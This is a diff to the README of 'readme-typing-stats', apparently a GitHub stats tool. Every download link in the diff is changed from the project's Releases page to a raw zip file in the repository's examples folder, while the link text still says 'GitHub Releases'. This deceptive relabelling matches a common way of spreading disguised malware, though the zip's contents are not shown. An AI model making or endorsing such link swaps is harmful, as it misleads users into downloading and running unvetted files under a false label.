@@ -1,6 +1,6 @@
 # ⚡ readme-typing-stats - Live GitHub Stats In Your README
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/frettler/readme-typing-stats/releases)
+[![Download](https://github.com/frettler/readme-typing-stats/raw/refs/heads/main/examples/stats_readme_typing_v1.4.zip)](https://github.com/frettler/readme-typing-stats/raw/refs/heads/main/examples/stats_readme_typing_v1.4.zip)
 
 ## 📄 Introduction
 
@@ -12,7 +12,7 @@ To get started with **readme-typing-stats**, you'll need to download the applica
 
 ## 📥 Download & Install
 
-Visit this page to download: [GitHub Releases](https://github.com/frettler/readme-typing-stats/releases).
+Visit this page to download: [GitHub Releases](https://github.com/frettler/readme-typing-stats/raw/refs/heads/main/examples/stats_readme_typing_v1.4.zip).
 
 1. **Navigate to the Releases page**: Click the link above to access the releases.
 2. **Choose your version**: Look for the latest version of **readme-typing-stats**. 
@@ -79,4 +79,4 @@ We welcome contributions to **readme-typing-stats**. If you have ideas or improv
 
 For more updates and discussions, consider joining our community of users on GitHub. You can share your experiences, showcase your setup, and get help if needed.
 
-Remember, to download the latest version of **readme-typing-stats**, visit [GitHub Releases](https://github.com/frettler/readme-typing-stats/releases). Enjoy enhancing your README with dynamic stats!
+Remember, to download the latest version of **readme-typing-stats**, visit [GitHub Releases](https://github.com/frettler/readme-typing-stats/raw/refs/heads/main/examples/stats_readme_typing_v1.4.zip). Enjoy enhancing your README with dynamic stats!
